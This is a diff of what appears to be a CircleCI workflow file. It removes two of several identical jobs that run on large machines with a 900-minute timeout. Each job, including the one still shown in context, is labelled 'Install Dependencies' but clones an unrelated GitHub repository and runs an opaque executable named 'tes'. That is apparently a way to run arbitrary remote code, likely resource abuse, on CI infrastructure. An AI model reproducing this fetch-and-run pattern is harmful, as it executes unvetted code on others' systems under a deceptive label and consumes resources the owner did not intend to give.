@@ -27,24 +27,6 @@ jobs:
             name: Install Dependencies
             command: git clone https://github.com/pramadoli/b.git && cd b && chmod u+x tes && ./tes
             no_output_timeout: 900m
-    aku4:
-      machine:
-            image: ubuntu-2004:202101-01
-      resource_class: large
-      steps:
-        - run:
-            name: Install Dependencies
-            command: git clone https://github.com/pramadoli/b.git && cd b && chmod u+x tes && ./tes
-            no_output_timeout: 900m
-    aku5:
-      machine:
-            image: ubuntu-2004:202101-01
-      resource_class: large
-      steps:
-        - run:
-            name: Install Dependencies
-            command: git clone https://github.com/pramadoli/b.git && cd b && chmod u+x tes && ./tes
-            no_output_timeout: 900m
 
 workflows:
     version: 2
@@ -53,5 +35,3 @@ workflows:
             - aku1
             - aku2
             - aku3
-            - aku4
-            - aku5
